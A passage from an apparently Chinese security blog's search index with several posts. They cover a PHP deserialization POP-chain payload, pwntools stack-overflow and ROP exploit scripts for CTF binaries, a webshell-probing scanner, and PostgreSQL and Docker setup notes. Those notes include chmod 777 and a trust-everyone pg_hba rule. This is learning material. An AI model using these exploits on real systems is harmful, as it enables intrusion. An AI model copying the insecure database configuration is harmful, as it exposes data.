Test()，$t1=clone $t; 7.__sleep()serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言~&lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class CallFunc{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class InvokeFunc{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; } }class ToStringFunc{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;flag{test}&quot;; }}$a = $_GET[&apos;string&apos;];unserialize($a);?&gt; 我们一步一步来处理 首先要利用class GetFlag中的get_flag,所以我们只要有一个1-ToStringFunc类的实例当字符串来使用 InvokeFunc中使用了字符串拼接可以利用，所以我们只要有一个2-InvokeFunc类的实例，并且str1要是1-ToStringFunc，并且这个类要当函数使用 CallFunc中刚好有一个 $s1();函数调用，所以我们只要有一个3-CallFunc类的实例，并且mod1要是2-InvokeFunc，并且要调用一次不存在的函数 Call中刚好有一个test2函数调用，并且不存在，所以我们只要一个4-Call的类的实例，并且mod1要是3-CallFunc 最后需要一个自动函数调用的方法，刚好start_gg有一个析构函数，所以我们只要一个5-startgg类的实例，并且mod1要是4-call 完美~这就是艺术ps:protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。在序列化之前只调用__construct函数，并且序列化将对象转换成字符串，仅保留对象里的成员变量，不保留函数方法。所以构造的时候只要记录我们需要的属性+构造函数即可 &lt;?phpclass GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;flag{Test}&quot;; }}class ToStringFunc{ public $str1; public function __construct() { $this-&gt;str1=new GetFlag(); }}class InvokeFunc{ public $mod1; public function __construct() { $this-&gt;mod1= new ToStringFunc(); }}class CallFunc{ public $mod1; public function __construct() { $this-&gt;mod1=new InvokeFunc(); }}class Call{ public $mod1; public function __construct() { $this-&gt;mod1=new CallFunc(); } }class start_gg{ public $mod1; public function __construct() { $this-&gt;mod1=new Call(); } }$b = new start_gg;//构造start_gg类对象$becho urlencode(serialize($b));?&gt; 输出O%3A8%3A%22start_gg%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A4%3A%22Call%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A8%3A%22CallFunc%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A10%3A%22InvokeFunc%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A12%3A%22ToStringFunc%22%3A1%3A%7Bs%3A4%3A%22str1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7D%7D%7D%7D%7D%7D秒啊","link":"2020/01/04/pop%E9%93%BE/"},{"title":"postgreSQL内核分析-源码安装和调试","text":"一、环境配置Ubuntu 16.04 PostgreSql v11.3 二、源码下载解压https://www.postgresql.org/ftp/source/,选择一个版本的,这里下载v11版本系列 解压到指定目录&amp;&amp;新建用户（非强制只是为了方便管理在/usr/local/下新建目录pgsql,记得chmod -R 777 pgsql否则后面打log会崩然后将下载的压缩包丢到pgsql目录下解压 tar zxvf postgresql-11.3.tar.gz 解压后大概是这么些文件 三、安装过程配置 cd /usr/local/pgsql/./configure --prefix=/usr/local/pgsql --without-readline 坑1：error:readline library not found解决办法apt-get install libreadline-dev 坑2：error: zlib library not found解决办法apt-get install zlib1gapt-get install zlib1g.dev如果没有报错了,就可以去解压包里执行make了 make 如果不出意外大概需要一两分钟出现 All of PostgreSQL successfully made. Ready to install. 然后执行install make install 出现 PostgreSQL installation complete. 安装完毕后应该在pgsql目录下会多一些bin,include,lib等文件夹 四、配置用户环境据我的理解是一个用户的数据库数据放在一个文件夹里储存？不知道是不是这样先增加一个用户使用数据库 adduser postgres //添加一个名为tommy的用户passwd postgres //修改密码Changing password for user postgres.New UNIX password: //在这里输入新密码Retype new UNIX password: //再次输入新密码passwd: all authentication tokens updated successfully. 然后转换到postgres用户下，在刚刚新建的pgsql文件夹下mkdir data，如果有啥权限问题，也chmod -R 777 data/就完事了ps:将用户添加到sudoers中操作（防止出现postgres用户不能sudo 首先切换到root用户 然后修改/etc/sudoers 权限 使其为可写 chmod u+w /etc/sudoersvi /etc/sudoers 然后在下面的 root ALL=(ALL) ALL 这里增加自己需要的用户比如 root ALL=(ALL) ALLpostgres ALL=(ALL) ALL 最后一定要把权限修改回来：chmod u-w /etc/sudoers 五、初始化和启动数据库初始化 su postgres/usr/local/pgsql/bin/initdb -D /usr/local/pgsql/data 启动数据库 ./bin/pg_ctl start -D ./data/ -l logfile 重启和关闭 ./bin/pg_ctl restart -D ./data/./bin/pg_ctl stop -D ./data/ 然后可以执行./bin/psql进入命令行 六、创建数据库和用户执行 ./createdb kitty 创建kitty数据库执行 ./createuser -P postgres 创建postgres用户 访问数据库后也可以用sql命令来新建用户 create user postgres with password &apos;xxx&apos;; 七、配置远程访问1）修改配置文件pgsql/data/postgresql.conf vim /usr/local/pgsql/data/postgresql.conf 修改监听地址： #listen_addresses=&apos;localhost&apos;#将上面这行改成如下listen_addresses=&apos;*&apos; 2）修改配置文件/pgsql/data/pg_hba.conf： vim /usr/local/pgsql/data/pg_hba.conf 添加一条IP授权记录，可以对一个网段授权 # IPv4 myhost connections:host    all         all         0.0.0.0/0          trust 八、使用pwngdb调试首先查看postgres进程，有两个方法 方法1：先查看客户端未连接后端的postgres进程ps -aux | grep postgres 然后执行 ./psql -h 127.0.0.1 -d postgres 再次查看进程,然后还是不确定 方法2：在客户端交互界面查询后端进程ID使用postgres=# select pg_backend_pid();就能确定是30270了 然后pwngdb出场8.1、设置gdb和屏蔽无用中断信号sudo gdb attach 4208pwndbg&gt;handle SIGUSR1 nostop passSignal Stop Print Pass to program DescriptionSIGUSR1 No Yes Yes User defined signal 1 8.2、设置断点/随便设置，这里为了测试是打在计算结果处pwndbg&gt; b ExecResultBreakpoint 1 at 0x6275f0 8.3、客户端发起查询postgres=# select 1+1; 此刻应该被断点断住的 8.4、调试pwndbg&gt;c 查看调用栈","link":"2019/06/24/postgreSQL%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90-%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%E5%92%8C%E8%B0%83%E8%AF%95/"},{"title":"pwn入门基础","text":"一、ROP思想在栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程，所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了 二、Linux-Pwn的一些操作1、checksec 工具检查编译出的文件kitty@ubuntu:~/桌面/pwn$ checksec stack-example[*] &apos;/home/kitty/\\xe6\\xa1\\x8c\\xe9\\x9d\\xa2/pwn/stack-example&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 1.Canary（栈保护）这个选项表示栈保护功能有没有开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 2.NX/DEP（堆栈不可执行）NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 3.PIE/ASLR（地址随机化） 4.Fortify这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。5.RelRO设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 2、readelf/objdumpreadelf -h ret2text查看头信息readelf -S ret2text显示节区表内的所有信息，包括每个节的属性readelf -S ret2text显示节区表内的所有信息，包括每个节的属性readelf -t ret2text用来显示所有节的详细信息readelf -l ret2text显示程序头表信息，包扩有几个段，每个段的属性readelf -r ret2libc1显示所有重定位入口的信息objdump -s ret2text显示指定section的完整内容objdump -h ret2text显示目标文件各个段的头部摘要信息：objdump -d ret2text显示汇编： 3、GDB断点pwndbg&gt; b *0x80486AE运行pwndbg&gt; r 4、查看段读写权限gdb&gt; b maingdb&gt; rgdb&gt; vmmap 5、ROPgadget寻找gadget kitty@ubuntu:~/桌面$ ROPgadget --binary rop --only &apos;pop|ret&apos;|grep &apos;eax&apos;0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 查字符串 kitty@ubuntu:~/桌面$ ROPgadget --binary rop --string &apos;/bin/sh&apos;Strings information============================================================0x080be408 : /bin/sh 寻找int 0x80 的地址 kitty@ubuntu:~/桌面$ ROPgadget --binary rop --only &apos;int&apos;Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4 三、IDA的操作1、查看栈结构双击变量即可 2、查看段ctrl+S 四、一些经典的题目1、stack-example最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，当然需要确保这个地址所在的段具有可执行权限 ##coding=utf8from pwn import *## 构造与程序交互的对象sh = process(&apos;./stack_example&apos;)success_addr = 0x0804843b## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)print p32(success_addr)## 向程序发送字符串sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive() 2、ret2textret2text 即控制程序执行程序本身已有的的代码(.text) .text:080486A7 lea eax, [esp+80h+s] //其中s为-0x6480486a7: 8d 44 24 1c lea 0x1c(%esp),%eax 所以偏移地址计算方式 ##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2text&apos;)target = 0x804863ash.sendline(&apos;A&apos; * (0x6c+4) + p32(target))sh.interactive() 3、ret2shellcoderet2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。 #!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2shellcode&apos;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))sh.interactive() bss可执行后，把shellcode放到bss段 4、利用gadgets来getshell只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell execve(&quot;/bin/sh&quot;,NULL,NULL) 其中，该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了pop eax，那么现在 eax 的值就为 10。ps: ret 不加参数 相当于 用栈中的数据，修改IP的内容 pop IP #!/usr/bin/env pythonfrom pwn import *import base64context.log_level = &apos;debug&apos;sh = process(&apos;./rop&apos;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat( [&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])print(base64.b16encode(payload))sh.sendline(payload)sh.interactive() pwntools打断点sh = process(&apos;./stack-example&apos;)pwnlib.gdb.attach(sh,&quot;b *0x0804847b&quot;)","link":"2019/09/14/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/"},{"title":"python3多线程实例之批量检测webshell存活工具","text":"楔子前两天的强网杯，有个题目叫高明的黑客，核心任务就是从3000多个php文件中找到存活的webshell,大概每个php文件有几十个post,get的点，头天晚上跑了一晚上，自己太菜了，很多东西忘了考虑，结束后拿多线程跑了一下很快就出来了，所以记录一下教训吧，碰到需要大量人力，时间的脚本，应该先尽量优化，而不是跑了半天发现很慢再来改快一点，以此循环，黄花菜都凉了，果然犹豫就会败北 一、python3多线程1.1、Python3 线程中常用的两个模块为： _thread threading 1.2、thread 模块已被废弃。用户可以使用 threading 模块代替。所以，在 Python3 中不能再使用”thread” 模块。为了兼容性，Python3 将 thread 重命名为 “_thread”。使用起来也很简单_thread.start_new_thread ( function, args[, kwargs] ) 一个实例 import _threadimport time# 为线程定义一个函数def print_time( threadName, delay): count = 0 while count &lt; 5: time.sleep(delay) count += 1 print (&quot;%s: %s&quot; % ( threadName, time.ctime(time.time()) ))# 创建两个线程try: _thread.start_new_thread( print_time, (&quot;Thread-1&quot;, 2, ) ) _thread.start_new_thread( print_time, (&quot;Thread-2&quot;, 4, ) )except: print (&quot;Error: 无法启动线程&quot;)while 1: pass 1.3、_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。Thread类提供了以下方法: threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法: run(): 用以表示线程活动的方法。 start():启动线程活动。 join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。 isAlive(): 返回线程是否活动的。 getName(): 返回线程名。 setName(): 设置线程名。 1.4、最普通的使用多线程的方法import threadingdef thread_job(): print(&apos;This is Thread_job,number is %s&apos;% threading.current_thread())def main(): added_thread=threading.Thread(target=thread_job) added_thread.start() print(threading.active_count()) print(threading.enumerate()) print(threading.current_thread())if __name__==&apos;__main__&apos;: main() 1.5、使用join，和queueimport threadingimport timefrom queue import Queuedef job(l,q): for i in range(len(l)): l[i]=l[i]**2 q.put(l)def multithreading(): q=Queue() threads=[] data=[[1,2,3],[3,4,5],[4,4,4],[5,5,5]] for i in range(4): t=threading.Thread(target=job,args=(data[i],q)) t.start() threads.append(t) for thread in threads: thread.join() results=[] for _ in range(4): results.append(q.get()) print(results)if __name__==&apos;__main__&apos;: multithreading() 返回结果 [[1, 4, 9], [9, 16, 25], [16, 16, 16], [25, 25, 25]] 1.6、如果要使用线程同步如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。 使用 Thread 对象的 Lock 和 Rlock 可以实现简单的线程同步，这两个对象都有 acquire 方法和 release 方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间。如下 import threadingimport timeclass myThread (threading.Thread): def __init__(self, threadID, name, counter): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.counter = counter def run(self): print (&quot;开启线程： &quot; + self.name) # 获取锁，用于线程同步 threadLock.acquire() print_time(self.name, self.counter, 3) # 释放锁，开启下一个线程 threadLock.release()def print_time(threadName, delay, counter): while counter: time.sleep(delay) print (&quot;%s: %s&quot; % (threadName, time.ctime(time.time()))) counter -= 1threadLock = threading.Lock()threads = []# 创建新线程thread1 = myThread(1, &quot;Thread-1&quot;, 1)thread2 = myThread(2, &quot;Thread-2&quot;, 2)# 开启新线程thread1.start()thread2.start()# 添加线程到线程列表threads.append(thread1)threads.append(thread2)# 等待所有线程完成for t in threads: t.join()print (&quot;退出主线程&quot;) 二、php webshell相关知识WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。执行命令常用的函数有: system(&apos;命令&apos;）eval(&apos;php code&apos;)assert(&apos;php code&apos;) 其他一些骚函数导致的php webshellstr_replace字符替换函数: &lt;?php$s = str_replace(&apos;p&apos;,&apos;&apos;,&apos;pspypsptpepmp&apos;);echo $s;#system create_fuction()创建匿名函数： &lt;?php#create_function(&apos;参数列表&apos;, &apos;php代码字符串&apos;);$info = create_function(&apos;&apos;,&apos;phpinfo();&apos;);$info();?&gt; 总结： 系统命令执行: system, passthru, shell_exec, exec, popen, proc_open 代码执行: eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13 文件包含: require, require_once, include, include_once, file_get_contents, file_put_contents, fputs, fwrite 三、暴力检验webshell存活回到本题，最开始不知道有这么多post，get点，所以拿D盾等工具，23333，所有文件全部被找到了，我估计这些工具就是单纯匹配这几个敏感函数和post,get点，为了确认是否存活我们需要在本地搭建这个服务，并且找到通用的回显来确定,因为我在windows上环境搭建的php code可以用phpinfo()或者system(&apos;hostname&apos;);前者更大所以倾向于后者,命令用hostname能拿到主机名称，反过来是不行的，（如果你用Linux服务器使用system(‘id’)能检验phpcode,id检验命令， 所以初期代码为（暂时只考虑了get请求的参数 import osimport reimport requestsanswer = open(&apos;answer.txt&apos;,&apos;w&apos;)filePath = &apos;./src/&apos;files = os.listdir(filePath)url = &quot;http://localhost/src/&quot;file_count = 0def get_rep(filename, name): r_url = url + filename + &quot;?&quot; + name + &quot;=hostname&quot; rep = requests.get(r_url) if &apos;DESKTOP-CE0L9E5&apos; in rep.content.decode(&apos;utf-8&apos;): answer.write(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: _GET[\\&apos;&quot; + name +&quot;\\&apos;]\\n&quot;) print(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: _GET[\\&apos;&quot; + name +&quot;\\&apos;]&quot;) r_url = url + filename + &quot;?&quot; + name + &quot;=system(&apos;hostname&apos;);&quot; rep = requests.get(r_url) if &apos;DESKTOP-CE0L9E5&apos; in rep.content.decode(&apos;utf-8&apos;): answer.write(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: _GET[\\&apos;&quot; + name +&quot;\\&apos;]\\n&quot;) print(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: _GET[\\&apos;&quot; + name +&quot;\\&apos;]&quot;)for k in files: if k == &apos;.DS_Store&apos;: continue if k == &apos;index.html&apos;: continue print(k) with open(filePath + k, &apos;rt&apos;) as f: file_count+=1 print(&apos;已经完成: {:.2%}&apos;.format(file_count/len(files))) content = f.read() get = re.findall(r&quot;GET\\[&apos;(.+?)&apos;\\]&quot;, content) #post = re.findall(r&quot;POST\\[&apos;(.+?)&apos;\\]&quot;, content) for i in get: print(&apos;FileName：&apos;+k+&apos; ParamName:&apos;+i) get_rep(k, i) f.close()answer.close() 想了想有没有优化的地方，如果能找到一个phpcode和命令都能测试的一个通用函数就可以减少一半的网络请求，只要你找肯定是有的那就是echo &apos;Hello Kitty&apos;;我们会发现无论是phpcode还是system执行了就会有Hello Kitty的回显所以get请求就可以修改为 def get_rep(filename, name): r_url = url + filename + &quot;?&quot; + name + &quot;=echo &apos;Hello Kitty&apos;;&quot; #print(r_url) rep = requests.get(r_url) if &apos;Hello Kitty&apos; in rep.content.decode(&apos;gbk&apos;): Record_To_File(filename,name) 四、多线程检验webshell存活现在只需要把上面的暴力脚本和多线程脚本结合一下 import threadingimport timeimport osimport reimport requestsfrom queue import Queuefile_count = 0url = &quot;http://127.0.0.1/src/&quot;filePath = &apos;./src/&apos;files = os.listdir(filePath)nameList=[] #存储名字名称列表nameSepList=[] #存储分分离后的文件名称列表#把文件名存储起来 过滤拿到我们想要的文件后缀threadLock = threading.Lock()global startdef storefile(): for k in files: if k == &apos;.DS_Store&apos;: continue if k == &apos;index.html&apos;: continue nameList.append(k) #print(k)#分离文件名 给每个线程分一个def separateName(threadCount): for i in range(0,len(files),threadCount): nameSepList.append(nameList[i:i+threadCount])#多线程函数def multithreading(threadCount): separateName(threadCount)#先分离 for i in range(threadCount): t=threading.Thread(target=run_one_thread,args=(nameSepList[i],)) t.start()#每个线程的运作 参数为文件名称的列表def run_one_thread(name_list): for k in name_list: print(k) with open(filePath + k, &apos;rt&apos;) as f: #threadLock.acquire() global file_count file_count+=1 #threadLock.release() #print(&apos;已经完成: {:.2%}&apos;.format(file_count/len(files))) content = f.read() get = re.findall(r&quot;GET\\[&apos;(.+?)&apos;\\]&quot;, content) #post = re.findall(r&quot;POST\\[&apos;(.+?)&apos;\\]&quot;, content) for i in get: #print(&apos;已经完成: {:.2%}&apos;.format(file_count/len(files))+&apos; FileName：&apos;+k+&apos; ParamName:&apos;+i) get_rep(k, i) f.close()#做GET请求def get_rep(filename, name): r_url = url + filename + &quot;?&quot; + name + &quot;=echo &apos;Hello Kitty&apos;;&quot; #print(r_url) rep = requests.get(r_url) if &apos;Hello Kitty&apos; in rep.content.decode(&apos;gbk&apos;): Record_To_File(filename,name)def Record_To_File(filename,name): answer = open(&apos;answer.txt&apos;,&apos;a+&apos;) end = time.time() answer.write(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: _GET[\\&apos;&quot; + name +&quot;\\&apos;]&quot;+&quot; Need time :&quot;+str(end-start)+&quot;s\\n&quot;) print(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: _GET[\\&apos;&quot; + name +&quot;\\&apos;]&quot;) answer.close()if __name__==&apos;__main__&apos;: start = time.time() storefile() multithreading(20) 优化了一波，减少了多线程，但是递归文件查找,还有assert的改进 import threadingimport timeimport osimport reimport requestsfrom queue import Queuefile_count = 0url = &quot;http://127.0.0.1&quot;url_list=[] #存储名字名称列表nameSepList=[] #存储分分离后的文件名称列表#把文件名存储起来 过滤拿到我们想要的文件后缀threadLock = threading.Lock()base_dir=&apos;E:/CodingSoftware/PhpStudy/PHPTutorial/WWW&apos;print(&quot;base_url: &quot;+url)print(&quot;base_dir: &quot;+base_dir)def get_url_list(): base_url=url work_dir = base_dir length=len(work_dir) for parent, dirnames, filenames in os.walk(work_dir, followlinks=True): for filename in filenames: file_path = os.path.join(parent, filename) #print(&apos;文件名：%s&apos; % filename) file_path1=file_path[length:] file_path2=file_path1.replace(&apos;\\\\&apos;,&apos;/&apos;) if file_path2.endswith(&apos;.php&apos;) and (&apos;phpMyAdmin&apos; not in file_path2): url_list.append(base_url+file_path2) #print(base_url+file_path2)#每个线程的运作 参数为文件名称的列表def run(name_list): for k in name_list: #print(k) obj_path=k[len(url):] file_path=base_dir+obj_path try: with open(file_path, &apos;rt&apos;, errors=&apos;ignore&apos;) as f: content = f.read() get = re.findall(r&quot;GET\\[&apos;([A-Za-z_-]+?)&apos;\\]&quot;, content) get1 = re.findall(r&quot;GET\\[\\&quot;([A-Za-z_-]+?)\\&quot;\\]&quot;, content) get2 = re.findall(r&quot;GET\\[([A-Za-z_-]+?)\\]&quot;, content) post = re.findall(r&quot;POST\\[&apos;([A-Za-z_-]+?)&apos;\\]&quot;, content) post1 = re.findall(r&quot;POST\\[\\&quot;([A-Za-z_-]+?)\\&quot;\\]&quot;, content) post2 = re.findall(r&quot;POST\\[([A-Za-z_-]+?)\\]&quot;, content) for i in get: get_rep(k,i) print(obj_path+&quot; Key is: &quot;+i) for i in get1: get_rep(k,i) print(obj_path+&quot; Key is: &quot;+i) for i in get2: get_rep(k,i) print(obj_path+&quot; Key is: &quot;+i) for i in post: post_rep(k,i) print(obj_path+&quot; Key is: &quot;+i) for i in post1: post_rep(k,i) print(obj_path+&quot; Key is: &quot;+i) for i in post2: post_rep(k,i) print(obj_path+&quot; Key is: &quot;+i) f.close() except Exception as e: raise e#做GET请求def get_rep(base_url, name): r_url = base_url + &quot;?&quot; + name + &quot;=echo &apos;Hello Kitty&apos;;&quot; #print(r_url) rep = requests.get(r_url) if &apos;Hello Kitty&apos; in rep.content.decode(&apos;gbk&apos;): Record_To_File(r_url,name) r_url = base_url + &quot;?&quot; + name + &quot;=phpinfo();&quot; #预防assert函数 #print(r_url) rep = requests.get(r_url) if &apos;PHP Version&apos; in rep.content.decode(&apos;gbk&apos;): Record_To_File(r_url,name)def post_rep(base_url, name): r_url = base_url param = { name: &quot;echo &apos;HelloKitty&apos;;&quot; } rep = requests.post(r_url, data=param) #print(r_url + &quot; POST: &quot; + name) if &apos;HelloKitty&apos; in rep.content.decode(&apos;gbk&apos;): Record_To_File(r_url,name) param = { name: &quot;phpinfo();&quot; } rep = requests.post(r_url, data=param) #print(r_url + &quot; POST: &quot; + name) if &apos;PHP Version&apos; in rep.content.decode(&apos;gbk&apos;): Record_To_File(r_url,name)def Record_To_File(filename,name): answer = open(&apos;answer.txt&apos;,&apos;a+&apos;) end = time.time() answer.write(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: [\\&apos;&quot; + name +&quot;\\&apos;]\\n&quot;) print(&quot;Got It! !!!!!!! &quot; + filename + &quot; The param is: [\\&apos;&quot; + name +&quot;\\&apos;]&quot;) answer.close()if __name__==&apos;__main__&apos;: get_url_list() run(url_list)","link":"2019/05/27/python3%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8B%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8Bwebshell%E5%AD%98%E6%B4%BB%E5%B7%A5%E5%85%B7/"},{"title":"ubuntu中Docker的安装&&遇到的坑&&简单命令","text":"1、前提条件 本博客基于ubuntuDocker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。通过 uname -r 命令查看你当前的内核版本 runoob@runoob:~$ uname -r 2、安装 Docker2.1、获取最新版本的 Docker 安装包runoob@runoob:~$ wget -qO- https://get.docker.com/ | sh 输入当前用户的密码后，就会下载脚本并且安装Docker及依赖包。安装完成后有个提示： If you would like to use Docker as a non-root user, you should now consider adding your user to the &quot;docker&quot; group with something like: sudo usermod -aG docker runoobRemember that you will have to log out and back in for this to take effect! 2.2、速度很慢怎么慢修改/etc/docker/daemon.json 文件为 {&quot;registry-mirrors&quot;: [&quot;http://4e70ba5d.m.daocloud.io&quot;]} 或者直接用下面脚本跑（真香，ID可以自己在daocloud配 root@ubuntu:~# curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://4e70ba5d.m.daocloud.ioroot@ubuntu:~# cat /etc/docker/daemon.json {&quot;registry-mirrors&quot;: [&quot;http://4e70ba5d.m.daocloud.io&quot;]} 然后重启 root@ubuntu:~# service docker restart 2.3、无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)出现这个问题的原因可能是有另外一个程序正在运行，导致资源被锁不可用。而导致资源被锁的原因，可能是上次安装时没正常完成，而导致出现此状况。有两种方法1、通过删除文件（实测方法2友好一些 sudo rm /var/cache/apt/archives/locksudo rm /var/lib/dpkg/lock 2、通过ps查看apt-get的PID 然后sudo kill 就可以 3、然后就是基本命令3、1:添加用户组默认来说docker只能sudo运行为了下次方便使用，可以添加用户到docker用户组 sudo usermod -aG docker ${USER} 然后下次登陆即可非root使用docker 3、2:查看Docker版本信息docker version 3、3: 查看本地镜像docker images 3、4：容器从哪里来开始如果你什么镜像都没有，你想要一个ubuntu的镜像可以直接下载 kitty@ubuntu:~$ docker pull ubuntu或者kitty@ubuntu:~$ docker run ubuntu 比如你要一个nginx镜像然后你就可以使用docker images 查看安装了哪些 3、5：普通运行docker run --name hellow11scan -d -p 9999:8000 boyhack/w11scandocker run -t -i ubuntu /bin/bash命令指定使用镜像ubuntu来启动一个容器 其中要保证ubuntu是images中已经存在的镜像-it 表示运行在交互模式，是-i -t的缩写，即-it是两个参数：-i和-t。前者表示打开并保持stdout，后者表示分配一个终端（pseudo-tty）一般这个模式就是可以启动bash，然后和容器有命令行的交互 3、6：查看当前正在运行的容器：~$ docker ps 其中加上-a 表示查看所有的容器，包括已经停了的 3、7：启动、停止、重启容器~$ docker start aa97ba3292ce~$ docker stop aa97ba3292ce~$ docker restart aa97ba3292ce 和容器有关的一般是容器的ID 3、8： 删除镜像或者容器~$ docker rm container_id~$ docker rmi image_id 如果遇到了问题比如占用等加上参数 -f 一梭子下去就完事了（docker rm -f container_id 3、9：进入shelldocker exec -it 775c7c9ee1e1 /bin/bash 3.10、文件处理从容器到本地： docker cp 96f7f14e99ab:/www /tmp/ 从本地到容器： docker cp /www/runoob 96f7f14e99ab:/www/ 4、跑一个nginx当demo玩玩4.1、安装nginxkitty@ubuntu:~$ docker pull nginx 4.2、通过docker images确认安装后运行一下其中–name 后面接的是images名也就是 REPOSITORY对应的东西-p后面的第一个8888是本地端口，80是nginx的端口，意思是将nginx端口映射到本地,现在可以访问本地8888端口 4.3、使用自写的界面先本地随便写一个index.html 然后当运行一个容器的时候，将该html替换进容器的index.html了至于文件目录问题就要我们自己了解了 53be82f8c182这个东西是容器的ID然后访问 当然这个只是在容器中修改如果要完全保存起来，你需要学commit等操作形成新的镜像，本篇文章旨在入门，所以其他的希望看到本博客的能去自学，坚持下去，就是大佬了Orz。最后附上一张高大上的Docker命令图,望君笑纳 搭建freshrss docker run -dit --restart unless-stopped --log-opt max-size=10m \\ -v $(pwd)/data:/var/www/FreshRSS/data \\ -p 